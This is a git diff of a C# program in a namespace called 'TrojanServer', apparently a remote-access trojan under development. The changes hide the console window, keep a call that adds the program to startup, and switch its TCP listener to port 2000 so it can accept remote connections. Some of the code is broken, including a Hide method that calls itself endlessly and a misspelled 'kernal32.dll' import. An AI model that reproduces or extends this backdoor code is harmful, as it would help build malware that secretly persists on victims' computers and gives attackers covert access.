@@ -1,4 +1,3 @@
-//Migrate to .NET 3.4 (look into getting kernal32.dll to work)
 using System;
 using System.Collections.Generic;
 using System.Net.Sockets;
@@ -7,26 +6,39 @@ using Microsoft.Win32;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Windows;
+
+
 
 
 namespace TrojanServer
 {
     class Program
     {
-        public static NetworkStream Reciever;
+        Process myProcess = new Process();
+                
         
-        [DllImport("kernal32.dll")]
-        static extern IntPtr GetcConsoleWindow();
+        public static NetworkStream Reciever;
 
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("kernal32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+
+        [DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool ShowWindow([In] IntPtr hWnd, [In] int nCmdShow);
 
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
-        
+        public void Hide()
+        {
+            this.Hide();
+        }
         public static void Recieve()
         {
+            
             while (true)
             {
                 try
@@ -131,10 +143,12 @@ namespace TrojanServer
         static void Main(string[] args)
 
         {
-            var handle = GetcConsoleWindow();
 
+            IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;
 
-            ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, 0);
+
+            Process myProcess = new Process();
 
 
 
@@ -152,12 +166,9 @@ namespace TrojanServer
 
                 AddToStartup();
 
-
-
-                TcpListener l = new TcpListener(80);
+                TcpListener l = new TcpListener(2000);
 
                 l.Start();
-
 
 
                 TcpClient Connection = l.AcceptTcpClient();
